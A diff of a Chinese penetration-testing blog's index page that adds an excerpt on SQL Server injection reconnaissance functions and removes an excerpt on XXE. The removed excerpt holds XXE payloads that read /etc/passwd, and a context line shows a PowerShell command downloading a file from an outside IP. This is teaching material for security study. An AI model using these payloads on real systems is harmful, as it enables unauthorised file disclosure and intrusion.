@@ -84,6 +84,56 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/sqlserver-injection/">SQL Server注入</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2018-09-04</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 基础信息探测 @@version @@SERVERNAME @@SERVICENAME ORIGINAL_LOGIN() SYSTEM_USER SUSER_NAME() HOST_NAME() HOST_ID() SESSION_USER CURRENT_USER USER USER_NAME() USER_ID() USER_SID()  
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/php-session-unserialize/">关于PHP SESSION反序列化</a></h2>
 
         
@@ -600,64 +650,6 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/xxe/">XXE漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2017-12-09</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xml">xml</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
-外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
-0x01 示例代码 实验环境：https://github.com/vulhub/vulhub/tree/master/php/php_xxe
-simplexml_load_string.php
-&lt;?php $data = file_get_contents('php://input'); $xml = simplexml_load_string($data); echo $xml-&gt;name;  0x02 读取文件  外部引用读取passwd  &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xdsec [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt;  &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xdsec [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt;   外部引用dtd文件读取passwd  evil.dtd中的内容为：&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
-    </p>
-
-    
-    <footer>
-        <a href="/posts/xxe/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -668,7 +660,7 @@ simplexml_load_string.php
             <i class="fa fa-chevron-left"></i>
         
 
-        <span>&nbsp;1 / 18&nbsp;</span>
+        <span>&nbsp;1 / 19&nbsp;</span>
         
         
             <a href="/page/2/"><i class="fa fa-chevron-right"></i></a>
@@ -719,7 +711,7 @@ simplexml_load_string.php
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(74)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(75)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -811,7 +803,7 @@ simplexml_load_string.php
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
-                <sup>15</sup>
+                <sup>16</sup>
             </p>
         
             <p style="display:inline-block;">
